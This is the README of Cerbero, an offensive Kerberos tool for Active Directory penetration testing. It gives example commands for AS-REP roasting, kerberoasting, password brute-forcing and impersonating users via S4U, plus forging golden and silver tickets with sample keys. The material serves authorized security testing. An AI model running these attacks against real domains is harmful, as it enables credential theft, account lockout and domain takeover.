<!-- cargo-sync-readme start -->

# Cerbero

Kerberos protocol attacker. Tool to perform several tasks
related with Kerberos protocol in an Active Directory pentest.

## Installation

From crates:
```sh
cargo install cerbero
```

From repo:
```sh
git clone https://gitlab.com/Zer1t0/cerbero.git
cd cerbero/
cargo build --release
```

## Commands
- [ask](#ask)
- [asreproast](#asreproast)
- [brute](#brute)
- [convert](#convert)
- [kerberoast](#kerberoast)
- [list](#list)

### Ask
The `ask` command allows to retrieve Kerberos tickets (TGT/TGS) from the KDC
(Domain Controller in Active Directory environment). Moreover also
perform requests to obtain tickets by using the S4U2Self and S4U2Proxy
Kerberos extensions.

Ask TGT:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!!
```

Ask TGS:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --spn ldap/under.world
```

Perform S4u2self:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus
```

Perform S4u2proxy:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus --spn ldap/under.world
```


### AsRepRoast
`asreproast` can be used to discover users that do not require
pre-authentication and retrieve a ticket to crack with hashcat or john.

Check many users:
```shell
cerbero asreproast under.world users.txt
```

Check many users with weak RC4 cipher (easier to crack):
```shell
cerbero asreproast under.world users.txt --cipher rc4
```

### Brute
`brute` performs TGTs requests in order to discover user credentials
based on the KDC response. This bruteforce technique allows you to
discover:
+ Valid username/password pairs
+ Valid usernames
+ Expired passwords
+ Blocked or disabled users

This attack should be performed carefully since can block user
accounts in case of perform many incorrect authentication attemps
for the same user.

Test many users and passwords:
```shell
cerbero brute under.world users.txt passwords.txt
```

Test one user and many passwords:
```shell
cerbero brute under.world Zeus passwords.txt
```

Test many users and one password:
```shell
cerbero brute under.world users.txt Olympus1234
```

Test one user and one password:
```shell
cerbero brute under.world Zeus Olympus1234
```

### Convert
Allows to `convert` ticket files between krb (Windows) and
ccache (Linux) formats.

Convert ccache to krb:
```shell
cerbero convert hades.ccache hades.krb
```

Convert krb to ccache:
```shell
cerbero convert hades.krb hades.ccache
```
### Craft
To `craft` golden and silver tickets.

Craft a golden ticket (by using the `krbtgt` AES256 key):
```shell
cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --aes-256 fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c
```

Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
```shell
cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --ntlm 29f9ab984728cc7d18c8497c9ee76c77 --spn cifs/styx,under.world
```

### Kerberoast
To format encrypted part of tickets in order to be cracked by hashcat or john.

```shell
cerbero kerberoast -s services.txt --realm under.world --user Hades -p IamtheKingofD34d!!
```

### List
`list` shows the tickets information of a credentials file. Similar
to `klist` command

```shell
cerbero list hades.ccache
```

## Credits
This work is based on great work of other people:
- [Impacket](https://github.com/SecureAuthCorp/impacket) of Alberto Solino [@agsolino](https://github.com/agsolino)
- [Rubeus](https://github.com/GhostPack/Rubeus) of Will [@harmj0y](https://twitter.com/harmj0y) and Elad Shamir [@elad_shamir](https://twitter.com/elad_shamir)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) of [@gentilkiwi](https://twitter.com/gentilkiwi) 

<!-- cargo-sync-readme end -->
